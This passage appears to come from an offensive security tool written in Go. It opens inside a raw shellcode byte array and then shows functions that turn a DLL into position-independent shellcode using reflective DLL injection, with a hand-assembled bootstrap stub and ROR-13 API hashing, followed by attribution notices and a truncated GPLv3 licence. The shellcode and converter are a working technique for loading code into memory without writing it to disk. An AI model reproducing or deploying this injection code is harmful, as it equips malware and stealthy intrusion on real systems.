0xC5, 0x8B, 0xD5, 0xFF, 0xD3, 0x45, 0x85, 0xFF, 0x0F, 0x84, 0x97, 0x00, 0x00, 0x00, 0x83, 0xBF, 0x8C, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x8A, 0x00, 0x00, 0x00, 0x8B, 0x97, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xD6, 0x44, 0x8B, 0x5A, 0x18, 0x45, 0x85, 0xDB, 0x74, 0x78, 0x83, 0x7A, 0x14, 0x00, 0x74, 0x72, 0x44, 0x8B, 0x52, 0x20, 0x33, 0xDB, 0x44, 0x8B, 0x4A, 0x24, 0x4C, 0x03, 0xD6, 0x4C, 0x03, 0xCE, 0x45, 0x85, 0xDB, 0x74, 0x5D, 0x45, 0x8B, 0x02, 0x4C, 0x03, 0xC6, 0x33, 0xC9, 0x41, 0x0F, 0xBE, 0x00, 0x4C, 0x03, 0xC5, 0xC1, 0xC9, 0x0D, 0x03, 0xC8, 0x41, 0x80, 0x78, 0xFF, 0x00, 0x75, 0xED, 0x44, 0x3B, 0xF9, 0x74, 0x10, 0x03, 0xDD, 0x49, 0x83, 0xC2, 0x04, 0x4D, 0x03, 0xCD, 0x41, 0x3B, 0xDB, 0x72, 0xD2, 0xEB, 0x2D, 0x41, 0x0F, 0xB7, 0x01, 0x83, 0xF8, 0xFF, 0x74, 0x24, 0x8B, 0x52, 0x1C, 0x48, 0x8B, 0x8C, 0x24, 0xD0, 0x00, 0x00, 0x00, 0xC1, 0xE0, 0x02, 0x48, 0x98, 0x48, 0x03, 0xC6, 0x44, 0x8B, 0x04, 0x02, 0x8B, 0x94, 0x24, 0xD8, 0x00, 0x00, 0x00, 0x4C, 0x03, 0xC6, 0x41, 0xFF, 0xD0, 0x48, 0x8B, 0xC6, 0x48, 0x83, 0xC4, 0x78, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5D, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x10, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x8B, 0xF1, 0x48, 0x8B, 0x50, 0x18, 0x4C, 0x8B, 0x4A, 0x10, 0x4D, 0x8B, 0x41, 0x30, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xB4, 0x00, 0x00, 0x00, 0x41, 0x0F, 0x10, 0x41, 0x58, 0x49, 0x63, 0x40, 0x3C, 0x33, 0xD2, 0x4D, 0x8B, 0x09, 0xF3, 0x0F, 0x7F, 0x04, 0x24, 0x42, 0x8B, 0x9C, 0x00, 0x88, 0x00, 0x00, 0x00, 0x85, 0xDB, 0x74, 0xD4, 0x48, 0x8B, 0x04, 0x24, 0x48, 0xC1, 0xE8, 0x10, 0x44, 0x0F, 0xB7, 0xD0, 0x45, 0x85, 0xD2, 0x74, 0x21, 0x48, 0x8B, 0x4C, 0x24, 0x08, 0x45, 0x8B, 0xDA, 0x0F, 0xBE, 0x01, 0xC1, 0xCA, 0x0D, 0x80, 0x39, 0x61, 0x7C, 0x03, 0x83, 0xC2, 0xE0, 0x03, 0xD0, 0x48, 0xFF, 0xC1, 0x49, 0x83, 0xEB, 0x01, 0x75, 0xE7, 0x4D, 0x8D, 0x14, 0x18, 0x33, 0xC9, 0x41, 0x8B, 0x7A, 0x20, 0x49, 0x03, 0xF8, 0x41, 0x39, 0x4A, 0x18, 0x76, 0x8F, 0x8B, 0x1F, 0x45, 0x33, 0xDB, 0x49, 0x03, 0xD8, 0x48, 0x8D, 0x7F, 0x04, 0x0F, 0xBE, 0x03, 0x48, 0xFF, 0xC3, 0x41, 0xC1, 0xCB, 0x0D, 0x44, 0x03, 0xD8, 0x80, 0x7B, 0xFF, 0x00, 0x75, 0xED, 0x41, 0x8D, 0x04, 0x13, 0x3B, 0xC6, 0x74, 0x0D, 0xFF, 0xC1, 0x41, 0x3B, 0x4A, 0x18, 0x72, 0xD1, 0xE9, 0x5B, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x42, 0x24, 0x03, 0xC9, 0x49, 0x03, 0xC0, 0x0F, 0xB7, 0x14, 0x01, 0x41, 0x8B, 0x4A, 0x1C, 0x49, 0x03, 0xC8, 0x8B, 0x04, 0x91, 0x49, 0x03, 0xC0, 0xEB, 0x02, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x83, 0xC4, 0x10, 0x5F, 0xC3}

	var shellcodez []byte

	if is64BitDLL(dllBytes) {
		bootstrapSize := 64

		// call next instruction (Pushes next instruction address to stack)
		bootstrap := []byte{0xe8, 0x00, 0x00, 0x00, 0x00}

		// Set the offset to our DLL from pop result
		dllOffset := bootstrapSize - len(bootstrap) + len(rdiShellcode64)

		// pop rcx - Capture our current location in memory
		bootstrap = append(bootstrap, 0x59)

		// mov r8, rcx - copy our location in memory to r8 before we start modifying RCX
		bootstrap = append(bootstrap, 0x49, 0x89, 0xc8)

		// add rcx, <Offset of the DLL>
		bootstrap = append(bootstrap, 0x48, 0x81, 0xc1)

		bootstrap = append(bootstrap, pack(uint32(dllOffset))...)

		// mov edx, <Hash of function>
		bootstrap = append(bootstrap, 0xba)
		bootstrap = append(bootstrap, functionHash...)

		// Setup the location of our user data
		// add r8, <Offset of the DLL> + <Length of DLL>
		bootstrap = append(bootstrap, 0x49, 0x81, 0xc0)
		userDataLocation := dllOffset + len(dllBytes)
		bootstrap = append(bootstrap, pack(uint32(userDataLocation))...)

		// mov r9d, <Length of User Data>
		bootstrap = append(bootstrap, 0x41, 0xb9)
		bootstrap = append(bootstrap, pack(uint32(len(userData)))...)

		// push rsi - save original value
		bootstrap = append(bootstrap, 0x56)

		// mov rsi, rsp - store our current stack pointer for later
		bootstrap = append(bootstrap, 0x48, 0x89, 0xe6)

		// and rsp, 0x0FFFFFFFFFFFFFFF0 - Align the stack to 16 bytes
		bootstrap = append(bootstrap, 0x48, 0x83, 0xe4, 0xf0)

		// sub rsp, 0x30 - Create some breathing room on the stack
		bootstrap = append(bootstrap, 0x48, 0x83, 0xec)
		bootstrap = append(bootstrap, 0x30) // 32 bytes for shadow space + 8 bytes for last arg + 8 bytes for stack alignment

		// mov dword ptr [rsp + 0x20], <Flags> - Push arg 5 just above shadow space
		bootstrap = append(bootstrap, 0xC7, 0x44, 0x24)
		bootstrap = append(bootstrap, 0x20)
		bootstrap = append(bootstrap, pack(uint32(flags))...)

		// call - Transfer execution to the RDI
		bootstrap = append(bootstrap, 0xe8)
		bootstrap = append(bootstrap, byte(bootstrapSize-len(bootstrap)-4)) // Skip over the remainder of instructions
		bootstrap = append(bootstrap, 0x00, 0x00, 0x00)

		// mov rsp, rsi - Reset our original stack pointer
		bootstrap = append(bootstrap, 0x48, 0x89, 0xf4)

		// pop rsi - Put things back where we left them
		bootstrap = append(bootstrap, 0x5e)

		// ret - return to caller
		bootstrap = append(bootstrap, 0xc3)

		shellcodez = append(bootstrap, rdiShellcode64...)
		shellcodez = append(shellcodez, dllBytes...)
		shellcodez = append(shellcodez, userData...)

	} else {
		bootstrapSize := 45

		// call next instruction (Pushes next instruction address to stack)
		bootstrap := []byte{0xe8, 0x00, 0x00, 0x00, 0x00}

		// Set the offset to our DLL from pop result
		dllOffset := bootstrapSize - len(bootstrap) + len(rdiShellcode32)

		// pop ecx - Capture our current location in memory
		bootstrap = append(bootstrap, 0x58)

		// mov ebx, eax - copy our location in memory to ebx before we start modifying eax
		bootstrap = append(bootstrap, 0x89, 0xc3)

		// add eax, <Offset to the DLL>
		bootstrap = append(bootstrap, 0x05)
		bootstrap = append(bootstrap, pack(uint32(dllOffset))...)

		// add ebx, <Offset to the DLL> + <Size of DLL>
		bootstrap = append(bootstrap, 0x81, 0xc3)
		userDataLocation := dllOffset + len(dllBytes)
		bootstrap = append(bootstrap, pack(uint32(userDataLocation))...)

		// push <Flags>
		bootstrap = append(bootstrap, 0x68)
		bootstrap = append(bootstrap, pack(uint32(flags))...)

		// push <Length of User Data>
		bootstrap = append(bootstrap, 0x68)
		bootstrap = append(bootstrap, pack(uint32(len(userData)))...)

		// push ebx
		bootstrap = append(bootstrap, 0x53)

		// push <hash of function>
		bootstrap = append(bootstrap, 0x68)
		bootstrap = append(bootstrap, functionHash...)

		// push eax
		bootstrap = append(bootstrap, 0x50)

		// call - Transfer execution to the RDI
		bootstrap = append(bootstrap, 0xe8)
		bootstrap = append(bootstrap, byte(bootstrapSize-len(bootstrap)-4)) // Skip over the remainder of instructions
		bootstrap = append(bootstrap, 0x00, 0x00, 0x00)

		// add esp, 0x14 - correct the stack pointer
		bootstrap = append(bootstrap, 0x83, 0xc4, 0x14)

		// ret - return to caller
		bootstrap = append(bootstrap, 0xc3)

		shellcodez = append(bootstrap, rdiShellcode32...)
		shellcodez = append(shellcodez, dllBytes...)
		shellcodez = append(shellcodez, userData...)
	}

	return shellcodez, nil

}

// pack is a helper function similar to struct.pack from python3
func pack(val uint32) []byte {
	bytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(bytes, val)
	return bytes
}

// hashFunctionName creates a ROR-13 hash of the provided function name
func hashFunctionName(name string) uint32 {
	function := []byte(name)
	function = append(function, 0x00)

	functionHash := uint32(0)

	for _, b := range function {
		functionHash = ror(functionHash, 13, 32)
		functionHash += uint32(b)
	}

	return functionHash
}

// ROR-13 implementation
func ror(val uint32, rBits uint32, maxBits uint32) uint32 {
	exp := uint32(math.Exp2(float64(maxBits))) - 1
	return ((val & exp) >> (rBits % maxBits)) | (val << (maxBits - (rBits % maxBits)) & exp)
}

// is64BitDLL will look at the PE header of the provided file, as bytes, to determine if it is a 64bit application
func is64BitDLL(dllBytes []byte) bool {
	machineIA64 := uint16(512)
	machineAMD64 := uint16(34404)

	headerOffset := binary.LittleEndian.Uint32(dllBytes[60:64])
	machine := binary.LittleEndian.Uint16(dllBytes[headerOffset+4 : headerOffset+4+2])

	// 64 bit
	if machine == machineIA64 || machine == machineAMD64 {
		return true
	}
	return false
}

/*
***********************************************************************************************
PIC_BindShell primitives and related works are released under the license below.
***********************************************************************************************

Copyright (c) 2013, Matthew Graeber
All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
The names of its contributors may not be used to endorse or promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


***********************************************************************************************
Reflective DLL Injection primitives and related works are released under the license below.
***********************************************************************************************

Copyright (c) 2015, Dan Staples

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

* Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

* Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

***********************************************************************************************
All other works under this project are licensed under GNU GPLv3
***********************************************************************************************


GNU GENERAL PUBLIC LICENSE
Version 3, 29 June 2007

Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
Everyone is permitted to copy and distribute verbatim copies
of this license document, but changing it is not allowed.

Preamble

The GNU General Public License is a free, copyleft license for
software and other kinds of works.

The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

The precise terms and conditions for copying, distribution and
modification follow.

TERMS AND CONDITIONS

0. Definitions.

"This License" refers to version 3 of the GNU General Public License.

"Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

"The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

A "covered work" means either the unmodified Program or a work based
on the Program.

To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

1. Source Code.

The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

The Corresponding Source for a work in source code form is that
same work.

2. Basic Permissions.

All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

3. Protecting Users' Legal Rights From Anti-Circumvention Law.

No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

4. Conveying Verbatim Copies.

You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

5. Conveying Modified Source Versions.

You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

a) The work must carry prominent notices stating that you modified
it, and giving a relevant date.

b) The work must carry prominent notices stating that it is
released under this License and any conditions added under section
7.  This requirement modifies the requirement in section 4 to
"keep intact all notices".

c) You must license the entire work, as a whole, under this
License to anyone who comes into possession of a copy.  This
License will therefore apply, along with any applicable section 7
additional terms, to the whole of the work, and all its parts,
regardless of how they are packaged.  This License gives no
permission to license the work in any other way, but it does not
invalidate such permission if you have separately received it.

d) If the work has interactive user interfaces, each must display
Appropriate Legal Notices; however, if the Program has interactive
interfaces that do not display Appropriate Legal Notices, your
work need not make them do so.

A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

6. Conveying Non-Source Forms.

You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

a) Convey the object code in, or embodied in, a physical product
(including a physical distribution medium), accompanied by the
Corresponding Source fixed on a durable physical medium
customarily used for software interchange.

b) Convey the object code in, or embodied in, a physical product
(including a physical distribution medium), accompanied by a
written offer, valid for at least three years and valid for as
long as you offer spare parts or customer support for that product
model, to give anyone who possesses the object code either (1) a
copy of the Corresponding Source for all the software in the
product that is covered by this License, on a durable physical
medium customarily used for software interchange, for a price no
more than your reasonable cost of physically performing this
conveying of source, or (2) access to copy the
Corresponding Source from a network server at no charge.

c) Convey individual copies of the object code with a copy of the
written offer to provide the Corresponding Source.  This
alternative is allowed only occasionally and noncommercially, and
only if you received the object code with such an offer, in accord
with subsection 6b.

d) Convey the object code by offering access from a designated
place (gratis or for a charge), and offer equivalent access to the
Corresponding Source in the same way through the same place at no
further charge.  You need not require recipients to copy the
Corresponding Source along with the object code.  If the place to
copy the object code is a network server, the Corresponding Source
may be on a different server (operated by you or a third party)
that supports equivalent copying facilities, provided you maintain
clear directions next to the object code saying where to find the
Corresponding Source.  Regardless of what server hosts the
Corresponding Source, you remain obligated to ensure that it is
available for as long as needed to satisfy these requirements.

e) Convey the object code using peer-to-peer transmission, provided
you inform other peers where the object code and Corresponding
Source of the work are being offered to the general public at no
charge under subsection 6d.

A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

"Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

7. Additional Terms.

"Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

a) Disclaiming warranty or limiting liability differently from the
terms of sections 15 and 16 of this License; or

b) Requiring preservation of specified reasonable legal notices or
author attributions in that material or in the Appropriate Legal
Notices displayed by works containing it; or

c) Prohibiting misrepresentation of the origin of that material, or
requiring that modified versions of such material be marked in
reasonable ways as different from the original version; or

d) Limiting the use for publicity purposes of names of licensors or
authors of the material; or

e) Declining to grant rights under trademark law for use of some
trade names, trademarks, or service marks; or

f) Requiring indemnification of licensors and authors of that
material by anyone who conveys the material (or modified versions of
it) with contractual assumptions of liability to the recipient, for
any liability that these contractual assumptions directly impose on
those licensors and authors.

All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

8. Termination.

You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

9. Acceptance Not Required for Having Copies.

You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

10. Automatic Licensing of Downstream Recipients.

Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

11. Patents.

A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

12. No Surrender of Others' Freedom.

If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
